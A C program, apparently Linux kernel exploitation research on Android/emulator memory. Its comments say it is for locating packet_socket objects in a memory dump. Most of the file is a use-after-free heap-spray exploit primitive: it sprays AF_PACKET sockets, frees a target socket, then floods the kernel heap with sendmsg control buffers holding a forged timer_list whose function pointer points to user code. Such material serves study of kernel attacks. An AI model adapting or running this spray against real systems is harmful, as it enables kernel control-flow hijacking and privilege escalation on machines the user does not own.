//The goal here is to create af packets.
//This should create struct packet_socket objects allocated by the SLUB allocator.
//I will then dump the memory on the emulator using lime and try to find these sockets.
//I can then compare the size with that of what I determined from my kernel module to print the sizes and output.
//(y)
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/wait.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <linux/sched.h>
#include <netinet/tcp.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sched.h>
#include <sys/utsname.h>
#include <pthread.h>
#define BUFLEN 723
#define DATALEN 8192
#define NUM_THREADS 200

#define TIMER_OFFSET 252
struct timer_list {
        int next;
        int prev;
        //struct list_head           entry;                /*     0     8 */
        long unsigned int          expires;              /*     8     4 */
        int base;//struct tvec_base *         base;                 /*    12     4 */
        void                       (*function)(long unsigned int); /*    16     4 */
        long unsigned int          data;                 /*    20     4 */
        int                        slack;                /*    24     4 */

};


#define PAD 64
//int  ad_fds[PAD];

#define CONF_RING_FRAMES 1

struct tpacket_req3 tp;
int sfd;
int mapped = 0;

//void kmalloc(void)
//{
//    while(1)
//        syscall(__NR_add_key, "user","wtf",exploitbuf,BUFSIZE-24,-2);
//}


void pad_kmalloc(void)
{
    int x;

    for(x=0; x<PAD; x++)
        if(socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP)) == -1) {
            //printf(stderr,"pad_kmalloc() socket error\n");
            exit(1);
        }

}

volatile int* check;


void func(long unsigned int asdf) {
    *check = 1;
    ;
}


void* lock_ctlbuf(void* threadid) {
    long tid = (long)threadid;
    char buf2[100];
    int fd,rc,i;
    struct sockaddr_in server;
    char message[1000] , server_reply[2000];
    union {
        char   control[CMSG_SPACE(BUFLEN)];
        struct cmsghdr cmh;
        struct {
            char padding[TIMER_OFFSET];
            struct timer_list timer;
    };

                        /* Space large enough to hold a ucred structure */

    } control_un;
    struct cmsghdr *cmhp;
    struct msghdr msgh;
    struct iovec iov;
    char data[DATALEN];
     
    //Create socket
    fd = socket(AF_INET , SOCK_STREAM , 0);
    if (fd == -1)
    {
        //printf("Could not create socket");
    }
    //puts("Socket created");
    int sendbuff = 2;
    if (setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sendbuff, sizeof(sendbuff)) < 0) {
        perror("Setting sock buff size");
    }
    //puts("Socket buffer size set");

     
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons( 5000 );
 
    //Connect to remote server
    if (connect(fd , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        perror("connect failed. Error");
    }
     
    //printf("Send Msg Test\n");
    memset(&control_un, 0x00, sizeof(control_un));
    memset(&control_un, 0x42, sizeof(control_un));
    control_un.cmh.cmsg_len = CMSG_LEN(BUFLEN);
    control_un.cmh.cmsg_level = SOL_SOCKET;
    control_un.cmh.cmsg_type = SCM_RIGHTS;
    control_un.timer.next = 0;
    control_un.timer.prev = 0;
    control_un.timer.expires = 4294943360u;
    control_un.timer.base = 0;
    control_un.timer.function = (void *)func;
    control_un.timer.data = 1;
    //control_un.timer.flags = 1;
    control_un.timer.slack = -1;


    //memset(&control_un, 'A', sizeof(control_un));
    //control_un.cmh.cmsg_len = CMSG_LEN(BUFLEN);
    //control_un.cmh.cmsg_level = SOL_SOCKET;
    //control_un.cmh.cmsg_type = SCM_RIGHTS;

    msgh.msg_name = NULL;
    msgh.msg_namelen = 0;

    msgh.msg_control = control_un.control;
    msgh.msg_controllen = sizeof(control_un.control);

    msgh.msg_iov = &iov;
    msgh.msg_iovlen = 1;
    iov.iov_base = &data;
    iov.iov_len = sizeof(data);
    memset(&data, 0x41, sizeof(data));

    ////printf("Res: %d %s", res, strerror(errno));
    for ( i = 0; i < 600; ++i) {

        int res = sendmsg(fd, &msgh,0);
        if( res < 0)  {
                perror("sendmsg");
        }
        //printf("Sent Message %d\n",i);
    }
    pthread_exit(NULL);
}

int main(int argc, char** argv) 
{
    int fd;
    int threadCount = atoi(argv[1]);

    check = (int*)malloc(sizeof(int));
    if (!check) {
        perror("failed to malloc check\n");
        exit(1);
    } 
    *check = 0;


    pad_kmalloc();

    fd=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_ARP));

    if (fd==-1) {
        //printf("target socket error\n");
        exit(1);
    }
    // want to create 
    struct stat tgtStat;
    if (fstat(fd,&tgtStat) < 0) {
        perror("fstat");
    } else {
        printf("target socket inode: %d\n", (unsigned int)tgtStat.st_ino);
        fflush(stdout);
    }


    pad_kmalloc();

    //printf(stderr,"sockets allocated\n");

    while(1) {
        char x = getc(stdin);
        if (x == 'b') {
            close(fd);
            //printf(stderr,"target socket freed\n");
            break;
        }
    }

    //start threads and alloc ctl buf's in slabs
    pthread_t dummy;
    long rc,t;
    for (t = 0; t < threadCount; t++) {
        rc = pthread_create(&dummy, NULL, lock_ctlbuf, (void*)t);
        if (rc) {
            perror("pthread_create()");
            exit(1);
        }
    }
    pthread_exit(NULL);
    sleep(13377);
    return 0;
}
